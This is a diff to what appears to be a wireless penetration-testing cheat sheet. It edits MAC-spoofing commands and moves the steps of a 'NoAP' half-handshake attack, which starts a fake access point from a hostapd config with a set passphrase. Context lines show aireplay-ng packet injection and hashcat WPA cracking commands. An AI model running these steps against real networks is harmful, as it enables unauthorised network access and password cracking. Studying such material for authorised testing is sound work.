@@ -241,7 +241,7 @@ sudo aireplay-ng -3 -b [target_BSSID] -h [your_MAC] wlan0 # -3 aireplay-ng attac
 ##### MAC spoofing
 Use one of the following methods 
 ```bash filename="Terminal" copy
-sudo systemctl stop NetworkManager
+sudo ifconfig wlan0 down
 sudo ip link set dev <INTERFACE> address <NEW_MAC_ADDRESS>
 ```
 Or
@@ -384,22 +384,6 @@ sudo hashcat -m 22000 -a 0 capture.22000 /path/to/dictionary.txt # crack
 #### NoAP
 Also known as half-handshake attack. So if the attack only requires the first 2 messages from the  handshake. and only the second message (sent by the client) is the one needed as its the one encrypted with the key. Why do we need the AP for ? Lets start our own AP based on clients probs
 1. **Prepare hostpad.conf**
-```c coyp filename="hostpad.conf" showLineNumbers
-interface=$INTERFACE
-driver=nl80211
-hw_mode=g
-channel=6
-ssid=$ESSID
-wpa=2
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP CCMP
-wpa_passphrase=12345678
-```
-2. **Start the fake AP**
-```copy bash filename="Terminal"
-hostpad hostpad.conf
-```
-**hostapd**
 ```c showLineNumbers copy fileanme="hostpad.conf"
 interface=$INTERFACE
 driver=nl80211
@@ -412,6 +396,11 @@ wpa_key_mgmt=WPA-PSK
 wpa_pairwise=TKIP CCMP
 wpa_passphrase=12345678
 ```
+2. **Start the fake AP**
+```copy bash filename="Terminal"
+hostpad hostpad.conf
+```
+
 3. <a href="#psk">**Dump and Crack**</a> 
 Don't forget to use `airodump-ng` on the bssid of our fake AP
 #### WPS PIN
